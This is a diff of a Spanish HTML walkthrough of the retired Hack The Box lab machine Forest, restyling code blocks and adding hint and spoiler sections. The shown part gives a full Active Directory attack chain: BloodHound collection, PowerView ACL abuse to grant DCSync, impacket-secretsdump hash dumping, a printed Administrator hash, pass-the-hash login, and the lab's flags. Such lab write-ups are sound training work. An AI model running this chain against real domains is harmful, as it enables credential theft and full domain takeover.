       <p>Recolecta toda la información del dominio (usuarios, grupos, permisos, relaciones) y la dibuja como un <b>grafo</b>. Su magia: calcula el <b>camino más corto</b> desde donde estás hasta Domain Admin, mostrando qué permiso abusar en cada paso. En un dominio real con miles de objetos, encontrar ese camino a mano es imposible.</p>
     </div>
 
     <h3 class="step">Recolectar (desde Kali)</h3>
-    <pre><span class="k">bloodhound-python</span> -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.62.145 -c All --zip</pre>
-    <p class="f"><code class="ic">-ns</code> es el DNS (el propio DC), <code class="ic">-c All</code> recolecta todo, <code class="ic">--zip</code> empaqueta. Genera un <code class="ic">.zip</code>. Warnings a ignorar: los <code class="ic">Kerberos → NTLM fallback</code> (recolecta igual por NTLM) y el <code class="ic">clock skew</code> (si algún día bloquea algo crítico: <code class="ic">sudo ntpdate 10.129.62.145</code>).</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">bloodhound-python</span> -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.62.145 -c All --zip</code></pre>
+    </figure><p class="f"><code class="ic">-ns</code> es el DNS (el propio DC), <code class="ic">-c All</code> recolecta todo, <code class="ic">--zip</code> empaqueta. Genera un <code class="ic">.zip</code>. Warnings a ignorar: los <code class="ic">Kerberos → NTLM fallback</code> (recolecta igual por NTLM) y el <code class="ic">clock skew</code> (si algún día bloquea algo crítico: <code class="ic">sudo ntpdate 10.129.62.145</code>).</p>
 
     <h3 class="step">Analizar (BloodHound CE)</h3>
-    <pre><span class="k">bloodhound-start</span>   <span class="cmt"># Web UI: http://127.0.0.1:8080  ·  admin/admin</span></pre>
-    <p class="f">En la interfaz, <b>Quick Upload</b> tu <code class="ic">.zip</code>, espera el procesado, y busca <code class="ic">svc-alfresco</code> para confirmar que cargó. En <b>Pathfinding</b>: origen <code class="ic">svc-alfresco</code>, destino <code class="ic">Exchange Windows Permissions</code>. El grafo:</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">bloodhound-start</span>   <span class="cmt"># Web UI: http://127.0.0.1:8080  ·  admin/admin</span></code></pre>
+    </figure><p class="f">En la interfaz, <b>Quick Upload</b> tu <code class="ic">.zip</code>, espera el procesado, y busca <code class="ic">svc-alfresco</code> para confirmar que cargó. En <b>Pathfinding</b>: origen <code class="ic">svc-alfresco</code>, destino <code class="ic">Exchange Windows Permissions</code>. El grafo:</p>
     <div class="path"><span class="node">svc-alfresco</span> <span class="rel">─MemberOf→</span> <span class="node">Service Accounts</span> <span class="rel">─MemberOf→</span> <span class="node">Privileged IT Accounts</span> <span class="rel">─MemberOf→</span> <span class="node">Account Operators</span> <span class="rel">─GenericAll→</span> <span class="node">Exchange Windows Permissions</span> <span class="rel">─WriteDacl→</span> <span class="node">HTB.LOCAL</span></div>
     <p class="f">Traducción: por su cadena de grupos, svc-alfresco llega a <b>Account Operators</b>, que tiene <b>GenericAll</b> (control total) sobre <b>Exchange Windows Permissions</b>, y ese grupo tiene <b>WriteDacl</b> sobre el <b>dominio entero</b>. Ese es el camino a Domain Admin.</p>
-  </div>
+  </details></div>
 </section>
 
-<!-- ===================== PRIVESC ===================== -->
-<section id="privesc" style="--acc:var(--violet)">
+<section id="privesc">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">06 · ACLs → DCSYNC → PASS-THE-HASH</h2></div>
     <div class="sec-focus">Tres movimientos que convierten permisos en Domain Admin.</div>
 
-    <div class="fcard">
+    <div class="hint"><b>PISTA</b>Compara los permisos habituales del sistema con los que tiene esta cuenta. Investiga los binarios que destacan.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard">
       <h4>▚ Los permisos que vamos a abusar</h4>
       <p><b>GenericAll</b> = control total sobre un objeto (puedes, por ejemplo, agregarte a un grupo). <b>WriteDacl</b> = puedes modificar la lista de permisos (DACL) de un objeto, y así <em>concederte a ti mismo</em> nuevos derechos. <b>DCSync</b> = abusar de la replicación entre DCs para pedirle al DC todos los hashes de contraseñas del dominio, como si fueras otro DC.</p>
     </div>
 
     <h3 class="step">Preparar PowerView (vía evil-winrm)</h3>
-    <pre><span class="cmt"># en Kali:</span>
+    <figure class="code-block" data-code-kind="example"><figcaption><span>Ejemplo de la guía</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar ejemplo de la guía">Copiar</button></figcaption><pre tabindex="0" aria-label="Ejemplo de la guía; desplazamiento horizontal disponible"><code><span class="cmt"># en Kali:</span>
 <span class="k">cp</span> /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/htb/forest/
 <span class="cmt"># en la sesión evil-winrm:</span>
 upload /home/iphobiuss/htb/forest/PowerView.ps1
-. .\PowerView.ps1                <span class="cmt"># dot-sourcing: carga las funciones (silencio = ok)</span></pre>
+. .\PowerView.ps1                <span class="cmt"># dot-sourcing: carga las funciones (silencio = ok)</span></code></pre>
 
-    <h3 class="step">Movimiento 1 · Agregarte al grupo (GenericAll)</h3>
-    <pre><span class="k">Add-DomainGroupMember</span> -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
-<span class="k">Get-DomainGroupMember</span> -Identity 'Exchange Windows Permissions' | Select-Object MemberName</pre>
-    <p class="f">La verificación muestra <code class="ic">svc-alfresco</code> como miembro. Ya perteneces al grupo con WriteDacl sobre el dominio.</p>
+    </figure><h3 class="step">Movimiento 1 · Agregarte al grupo (GenericAll)</h3>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">Add-DomainGroupMember</span> -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
+<span class="k">Get-DomainGroupMember</span> -Identity 'Exchange Windows Permissions' | Select-Object MemberName</code></pre>
+    </figure><p class="f">La verificación muestra <code class="ic">svc-alfresco</code> como miembro. Ya perteneces al grupo con WriteDacl sobre el dominio.</p>
 
     <h3 class="step">Movimiento 2 · Concederte DCSync (WriteDacl)</h3>
-    <pre>$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+    <figure class="code-block" data-code-kind="example"><figcaption><span>Ejemplo de la guía</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar ejemplo de la guía">Copiar</button></figcaption><pre tabindex="0" aria-label="Ejemplo de la guía; desplazamiento horizontal disponible"><code>$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
-<span class="k">Add-DomainObjectAcl</span> -Credential $cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync</pre>
-    <div class="why"><b>TIMING</b>La pertenencia al grupo tarda unos segundos en propagarse. Si el Movimiento 2 da error de permisos, espera 10-15 s y reintenta.</div>
+<span class="k">Add-DomainObjectAcl</span> -Credential $cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync</code></pre>
+    </figure><div class="why"><b>TIMING</b>La pertenencia al grupo tarda unos segundos en propagarse. Si el Movimiento 2 da error de permisos, espera 10-15 s y reintenta.</div>
 
     <h3 class="step">Movimiento 3 · DCSync (desde Kali)</h3>
-    <pre><span class="k">impacket-secretsdump</span> htb.local/svc-alfresco:s3rvice@10.129.62.145</pre>
-    <p class="f">El <code class="ic">rpc_s_access_denied</code> inicial es un método secundario: se ignora, porque debajo vuelca <b>todos los hashes del dominio</b>. La línea que importa (RID <code class="ic">500</code> = Administrator):</p>
-    <pre>htb.local\Administrator:500:aad3b435...:<span class="o">32693b11e6aa90eb43d32c72a07ceea6</span>:::</pre>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">impacket-secretsdump</span> htb.local/svc-alfresco:s3rvice@10.129.62.145</code></pre>
+    </figure><p class="f">El <code class="ic">rpc_s_access_denied</code> inicial es un método secundario: se ignora, porque debajo vuelca <b>todos los hashes del dominio</b>. La línea que importa (RID <code class="ic">500</code> = Administrator):</p>
+    <figure class="code-block" data-code-kind="example"><figcaption><span>Ejemplo de la guía</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar ejemplo de la guía">Copiar</button></figcaption><pre tabindex="0" aria-label="Ejemplo de la guía; desplazamiento horizontal disponible"><code>htb.local\Administrator:500:aad3b435...:<span class="o">32693b11e6aa90eb43d32c72a07ceea6</span>:::</code></pre>
 
-    <h3 class="step">Pass-the-Hash · Domain Admin</h3>
+    </figure><h3 class="step">Pass-the-Hash · Domain Admin</h3>
     <p class="f">No hace falta crackear ese hash. En Windows te autenticas con el hash directamente (<b>Pass-the-Hash</b>): en vez de <code class="ic">-p contraseña</code>, usas <code class="ic">-H hash</code>.</p>
-    <pre><span class="k">evil-winrm</span> -i 10.129.62.145 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
-<span class="k">type</span> C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># -&gt; 650ace87ec9847f97c3deb4b998ef61a</span></pre>
-    <p class="f"><b>Eres Domain Admin. Forest comprometida por completo.</b></p>
-  </div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">evil-winrm</span> -i 10.129.62.145 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+<span class="k">type</span> C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># -&gt; 650ace87ec9847f97c3deb4b998ef61a</span></code></pre>
+    </figure><p class="f"><b>Eres Domain Admin. Forest comprometida por completo.</b></p>
+  </details></div>
 </section>
 
-<!-- ===================== TASKS ===================== -->
-<section id="tasks" style="--acc:var(--amber)">
+<section id="tasks">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">TASKS · GUIDED MODE</h2></div>
     <div class="sec-focus">Las flags son de una instancia concreta. En tu máquina serán distintas.</div>
-    <div class="tblwrap"><table>
-      <tr><th>Task</th><th>Respuesta</th></tr>
+    <details class="spoiler"><summary>Mostrar respuestas del laboratorio</summary><div class="tblwrap"><table>
+      <tr><th scope="col">Task</th><th scope="col">Respuesta</th></tr>
       <tr><td>¿De qué dominio es esta máquina el Domain Controller?</td><td class="ans">htb.local</td></tr>
       <tr><td>Servicio que permite autenticación anónima e info valiosa</td><td class="ans">LDAP</td></tr>
       <tr><td>¿Qué usuario tiene la pre-autenticación de Kerberos deshabilitada?</td><td class="ans">svc-alfresco</td></tr>
@@ -271,11 +219,10 @@ $cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',
       <tr><td>User flag</td><td><code>8a961daab9f55e5a4a4a738aa69b0434</code></td></tr>
       <tr><td>Root flag</td><td><code>650ace87ec9847f97c3deb4b998ef61a</code></td></tr>
     </table></div>
-  </div>
+  </details></div>
 </section>
 
-<!-- ===================== TAKEAWAYS ===================== -->
-<section id="takeaways" style="--acc:var(--green)">
+<section id="takeaways">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">CONCEPTOS NUEVOS (EL MUNDO AD)</h2></div>
     <div class="sec-focus">Forest abre Active Directory: un arsenal entero que Cap y Knife no tenían.</div>
@@ -294,18 +241,4 @@ $cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',
     </ul>
   </div>
 </section>
-</main>
-
-<footer>
-  <div><span class="g">iphobiuss@offsec</span>:~$ <span class="mono">echo "del anonymous bind al Domain Admin: nueve saltos, un dominio entero."</span></div>
-  <div>Forest · Hack The Box · máquina retirada · guía para principiantes · #3 de la serie · primera AD</div>
-  <div>
-    <a href="index.html">Knowledge base</a> ·
-    <a href="knife.html">← Knife</a> ·
-    <a href="https://github.com/iphobiuss" target="_blank" rel="noopener">GitHub</a> ·
-    <a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" target="_blank" rel="noopener">LinkedIn</a>
-  </div>
-  <div class="rev">Sebastián Latorre Muñoz · Santiago, CL</div>
-</footer>
-</body>
-</html>
+<nav class="series-nav" aria-label="Navegación por la serie"><a href="knife.html"><small>ANTERIOR · GUÍA 02</small><span>← Knife</span></a><a href="vaccine.html"><small>SIGUIENTE · GUÍA 04</small><span>Vaccine →</span></a></nav></div></div></main><footer class="footer"><div class="shell"><div class="footer-top"><div><a class="brand" href="index.html">iphobiuss<span>::offsec</span></a><p>Sebastián Latorre Muñoz · Santiago, Chile</p></div><div class="footer-links"><a href="fundamentos.html">Fundamentos</a><a href="fundamentos.html#glosario">Glosario</a><a href="https://github.com/iphobiuss" rel="noopener noreferrer" target="_blank">GitHub</a><a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" rel="noopener noreferrer" target="_blank">LinkedIn</a><button class="small-button js-only" data-retro-toggle aria-pressed="false" type="button" hidden>Efectos retro</button></div></div><div class="footer-note">Material educativo para laboratorios y evaluaciones autorizadas. La base de técnicas utiliza ejemplos genéricos; los writeups documentan laboratorios de práctica de HTB. No son informes ni soluciones de exámenes de certificación.</div></div></footer><p id="action-status" class="sr-only" role="status" aria-live="polite"></p></body></html>
